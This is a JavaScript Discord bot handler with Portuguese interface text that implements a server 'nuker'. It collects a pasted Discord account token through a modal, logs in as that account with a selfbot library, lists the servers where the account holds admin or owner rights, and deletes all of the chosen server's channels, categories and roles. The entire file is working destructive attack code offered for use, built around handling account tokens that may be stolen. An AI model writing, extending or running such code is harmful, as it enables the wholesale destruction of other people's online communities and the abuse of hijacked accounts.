const { ModalBuilder, TextInputBuilder, ActionRowBuilder, ChannelType, StringSelectMenuBuilder } = require("discord.js");
const { Client: SelfbotClient } = require("discord.js-selfbot-v13");

const OWNER_ID = '831304519287046175';
const sessionData = new Map();

module.exports = {
    name: "interactionCreate",
    run: async (interaction) => {
        const { customId, user, client } = interaction;
        if (!customId) return;

        const handlers = {
            panelnuker_v2: showNukerModal,
            panelnukermodal_v2: handleNukerModal,
            selectGuild_v2: handleGuildSelection
        };

        const handler = handlers[customId];
        if (handler) {
            await handler(interaction, user, client);
        }
    }
};

async function showNukerModal(interaction) {
    const modal = createNukerModal();
    try {
        await interaction.showModal(modal);
    } catch (error) {
        console.error("Erro ao mostrar o modal:", error);
        await interaction.reply({ content: "❌ **| Ocorreu um erro ao mostrar o modal.**", ephemeral: true });
    }
}

function createNukerModal() {
    return new ModalBuilder()
        .setCustomId("panelnukermodal_v2")
        .setTitle("Nuker")
        .addComponents(
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId("token_v2")
                    .setLabel("TOKEN")
                    .setStyle(1)
                    .setPlaceholder("TOKEN QUE DESEJA USAR PARA NUKAR")
                    .setRequired(true)
            )
        );
}

async function handleNukerModal(interaction, user) {
    const token = interaction.fields.getTextInputValue("token_v2");
    sessionData.set(user.id, { token });
    await interaction.reply({ content: "<:icons_fingerprint:1261366785848901652> Verificando as informações...", ephemeral: true });

    const self = new SelfbotClient();
    try {
        await self.login(token);
    } catch {
        return interaction.editReply({ content: "<:icons_Wrong:1261798468532568174> Token inválido", ephemeral: true });
    }

    const guildOptions = getGuildOptions(self);
    const selectMenu = createGuildSelectMenu(guildOptions);

    try {
        await interaction.editReply({
            content: 'Selecione o servidor que deseja nukar:',
            components: [new ActionRowBuilder().addComponents(selectMenu)]
        });
    } catch (error) {
        console.error("Erro ao editar a resposta:", error);
        await interaction.editReply({ content: "❌ **| Ocorreu um erro ao editar a resposta.**", ephemeral: true });
    }
}

function getGuildOptions(self) {
    return self.guilds.cache
        .filter(guild => guild.members.me.permissions.has("ADMINISTRATOR") || guild.ownerId === self.user.id)
        .map(guild => ({
            label: guild.name,
            value: guild.id
        }))
        .slice(0, 25);
}

function createGuildSelectMenu(guildOptions) {
    return new StringSelectMenuBuilder()
        .setCustomId('selectGuild_v2')
        .setPlaceholder('Selecione o servidor que deseja nukar')
        .addOptions(guildOptions);
}

async function handleGuildSelection(interaction, user) {
    const guildId = interaction.values[0];
    const { token } = sessionData.get(user.id);
    const self = new SelfbotClient();

    try {
        await self.login(token);
    } catch (error) {
        console.error("Erro ao fazer login com o token:", error);
        return interaction.reply({ content: "❌ **| Ocorreu um erro ao fazer login com o token.**", ephemeral: true });
    }

    const guild = self.guilds.cache.get(guildId);
    if (!guild) return interaction.reply({ content: "<:icons_Wrong:1261798468532568174> A conta não está no servidor", ephemeral: true });

    await interaction.update({ content: `<:icons_clock:1261798597842829312> **| Apagando todos os Canais, Categorias e Cargos do Servidor \`${guild.name}\`**`, components: [] });

    try {
        await nukeGuild(guild);
        await interaction.editReply({ content: `<:icons_Correct:1261798879578558484> Servidor \`${guild.name}\` apagado com sucesso` });
    } catch (error) {
        console.error("Erro ao apagar o servidor:", error);
        await interaction.editReply({ content: "❌ **| Ocorreu um erro ao apagar o servidor.**", ephemeral: true });
    }
}

async function nukeGuild(guild) {
    const deletePromises = [
        ...guild.channels.cache.map(c => c.delete().catch(() => {})),
        ...guild.roles.cache.map(r => r.delete().catch(() => {}))
    ];
    await Promise.all(deletePromises);
}